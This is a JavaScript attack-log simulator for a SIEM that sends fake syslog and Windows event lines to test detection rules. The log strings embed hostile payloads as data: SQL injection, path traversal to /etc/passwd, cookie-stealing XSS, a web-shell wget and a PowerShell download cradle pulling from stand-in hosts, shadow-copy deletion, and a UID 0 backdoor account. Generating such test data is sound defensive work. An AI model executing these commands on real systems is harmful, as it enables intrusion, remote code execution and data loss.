// Attack simulator: sends realistic syslog lines to NocaSIEM so you can see
// decoding, detection rules and correlation working without real devices.
//
//   npm run test-log                        a mixed sample of normal and suspicious events
//   npm run test-log -- --scenario all      every scenario below, one after another
//   npm run test-log -- --scenario ssh      SSH brute force, then a successful login (compromise)
//   npm run test-log -- --scenario portscan firewall blocks across 20 ports from one IP
//   npm run test-log -- --scenario web      SQL injection, path traversal, XSS, scanner, 404 burst
//   npm run test-log -- --scenario windows  failed logons, RDP success, admin group change, log cleared
//   npm run test-log -- --scenario linux    sudo root shell, UID 0 user, user added to sudo
//   npm run test-log -- --scenario router   MikroTik login brute force, pfSense blocks
//   npm run test-log -- --host 192.168.1.20 send to another machine
//
// Lines sent from this PC arrive from 127.0.0.1, so register a source with
// IP 127.0.0.1 in Settings first (unregistered IPs are ignored).

import "../server/env.js";
import dgram from "node:dgram";

const args = process.argv.slice(2);
const arg = (name) => {
  const i = args.indexOf(`--${name}`);
  return i >= 0 ? args[i + 1] : undefined;
};
const host = arg("host") || "127.0.0.1";
const port = Number(process.env.INGEST_PORT) || 5514;
const scenario = arg("scenario") || (args.includes("--brute-force") ? "ssh" : "mixed");

const MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
function stamp() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  return `${MONTHS[d.getMonth()]} ${String(d.getDate()).padStart(2, " ")} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}
const syslog = (hostname, tag, msg, pri = 38) => `<${pri}>${stamp()} ${hostname} ${tag}: ${msg}`;
const winEvent = (fields) => syslog("DESKTOP-01", "MSWinEventLog[4]", JSON.stringify({ Hostname: "DESKTOP-01", Channel: "Security", ...fields }), 14);
const range = (n) => Array.from({ length: n }, (_, i) => i);

const SCENARIOS = {
  mixed: () => [
    syslog("web01", "sshd[2211]", "Accepted publickey for alice from 192.168.1.50 port 50522 ssh2"),
    syslog("web01", "sshd[2212]", "Failed password for root from 203.0.113.7 port 41122 ssh2"),
    syslog("fw01", "kernel", "[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=192.168.1.10 LEN=60 PROTO=TCP SPT=51515 DPT=3389"),
    `203.0.113.50 - - [${new Date().toUTCString()}] "GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 403 162 "-" "sqlmap/1.8"`,
    syslog("web01", "sudo[900]", "   bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update"),
    winEvent({ EventID: 4625, TargetUserName: "Administrator", IpAddress: "203.0.113.80", LogonType: 3 }),
    syslog("nas01", "av", "Malware signature match Trojan.Generic in /share/Public/invoice.exe"),
    syslog("web01", "cron[3100]", "(backup) CMD (/usr/local/bin/nightly-backup.sh)"),
  ],
  ssh: () => [
    ...range(8).map((i) => syslog("web01", `sshd[${3000 + i}]`, `Failed password for root from 203.0.113.99 port ${51000 + i} ssh2`)),
    ...["admin", "test", "oracle", "ubuntu", "git"].map((u, i) => syslog("web01", `sshd[${3100 + i}]`, `Failed password for invalid user ${u} from 198.51.100.77 port ${52000 + i} ssh2`)),
    syslog("web01", "sshd[3200]", "Accepted password for root from 203.0.113.99 port 51999 ssh2"),
  ],
  portscan: () => range(20).map((i) => syslog("fw01", "kernel", `[UFW BLOCK] IN=eth0 OUT= SRC=198.51.100.23 DST=192.168.1.10 LEN=44 PROTO=TCP SPT=40000 DPT=${[21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 1433, 3306, 3389, 5432, 5900, 6379, 8080][i]}`)),
  web: () => {
    const t = new Date().toUTCString();
    const req = (path, status, ua = "Mozilla/5.0") => `203.0.113.66 - - [${t}] "GET ${path} HTTP/1.1" ${status} 512 "-" "${ua}"`;
    return [
      req("/products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users", 500),
      req("/download.php?file=../../../../etc/passwd", 400),
      req("/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200),
      req("/upload/shell.php?cmd=;wget%20http://203.0.113.66/x.sh", 404),
      req("/", 200, "Nikto/2.5.0"),
      req("/.env", 404),
      ...range(22).map((i) => req(`/admin${i}/`, 404, "gobuster/3.6")),
    ];
  },
  windows: () => [
    ...range(8).map((i) => winEvent({ EventID: 4625, TargetUserName: ["Administrator", "admin", "user", "backup", "svc_sql", "guest", "test", "john"][i], IpAddress: "203.0.113.80", LogonType: 10 })),
    winEvent({ EventID: 4624, TargetUserName: "Administrator", IpAddress: "203.0.113.80", LogonType: 10 }),
    winEvent({ EventID: 4720, SubjectUserName: "Administrator", TargetUserName: "support$" }),
    winEvent({ EventID: 4732, SubjectUserName: "Administrator", TargetUserName: "Administrators", MemberName: "support$" }),
    winEvent({ EventID: 4104, Channel: "Microsoft-Windows-PowerShell/Operational", ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.80/a.ps1')" }),
    winEvent({ EventID: 4688, NewProcessName: "C:\\Windows\\System32\\vssadmin.exe", CommandLine: "vssadmin.exe delete shadows /all /quiet" }),
    winEvent({ EventID: 7045, Channel: "System", ServiceName: "UpdaterSvc", ImagePath: "C:\\Users\\Public\\svc.exe" }),
    winEvent({ EventID: 1102, SubjectUserName: "Administrator" }),
  ],
  linux: () => [
    syslog("web01", "sudo[901]", "   bob : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash"),
    syslog("web01", "sudo[902]", "   bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash"),
    syslog("web01", "useradd[1200]", "new user: name=sysupdate, UID=0, GID=0, home=/home/sysupdate, shell=/bin/bash"),
    syslog("web01", "usermod[1201]", "add 'sysupdate' to group 'sudo'"),
    syslog("web01", "passwd[1202]", "pam_unix(passwd:chauthtok): password changed for sysupdate"),
  ],
  router: () => [
    ...range(6).map(() => "system,error,critical login failure for user admin from 198.51.100.99 via winbox"),
    "system,info,account user admin logged in from 198.51.100.99 via winbox",
    ...range(5).map((i) => syslog("pfsense", "filterlog[123]", `5,,,1000000103,igb0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.23,192.168.1.1,${40000 + i},22,0,S,1,,1460,,`, 134)),
  ],
};
SCENARIOS.all = () => ["mixed", "ssh", "portscan", "web", "windows", "linux", "router"].flatMap((name) => SCENARIOS[name]());

if (!SCENARIOS[scenario]) {
  console.error(`Unknown scenario "${scenario}". Choose one of: ${Object.keys(SCENARIOS).join(", ")}`);
  process.exit(1);
}

const lines = SCENARIOS[scenario]();
const socket = dgram.createSocket("udp4");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

for (const line of lines) {
  await new Promise((resolve, reject) => socket.send(line, port, host, (err) => (err ? reject(err) : resolve())));
  console.log(`sent -> ${host}:${port}  ${line.length > 150 ? `${line.slice(0, 147)}...` : line}`);
  await sleep(15); // stay well under the 100 lines/second per-source limit
}
socket.close();
console.log(`\nSent ${lines.length} lines (scenario: ${scenario}). Open the Alerts page to see what was detected.`);
console.log("Nothing showing up? Make sure a source with IP 127.0.0.1 (when testing on this PC) is registered in Settings.");
